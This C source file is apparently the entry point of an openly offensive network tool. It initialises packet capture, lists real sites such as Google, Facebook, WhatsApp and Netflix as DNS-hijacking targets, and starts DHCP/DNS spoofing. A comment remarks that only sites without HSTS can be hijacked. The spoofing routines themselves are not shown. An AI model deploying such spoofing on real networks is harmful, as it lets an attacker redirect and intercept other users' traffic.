#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Spoofing.h"
#include "Headers.h"
#include "Utils.h"
#include <Windows.h>

#define HAVE_REMOTE
#define WPCAP

#include <pcap.h>
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")
#include <Mstcpip.h>

int main()
{
	WSADATA wsock;
	WSAStartup(MAKEWORD(2, 2), &wsock);

	HANDLE hThread;
	DWORD hThreadID;
	AddressInfo info{};

	getAddrInfo(&info);	// Inits all data for the struct, all info referfing the network

	/*Set the list of sites for the dns hijacking-*/
	int nSites = 0;
	info.DNS_sites = (char**)malloc(sizeof(char*) * HIJACKED_SITES);
	info.DNS_sites[nSites++] = (char*)"www.google.com";
	info.DNS_sites[nSites++] = (char*)"www.facebook.com";
	info.DNS_sites[nSites++] = (char*)"web.whatsapp.com";
	info.DNS_sites[nSites++] = (char*)"www.netflix.com";
	info.DNS_sites[nSites++] = (char*)"www.youtube.com";
	/* only the sites below work because of HSTS */
	info.DNS_sites[nSites++] = (char*)"idk.com";
	info.DNS_sites[nSites++] = (char*)"what.com";

	startSpoofing((LPVOID)&info); // start the spoofing of the DHCP and 

	free(info.DNS_sites);
}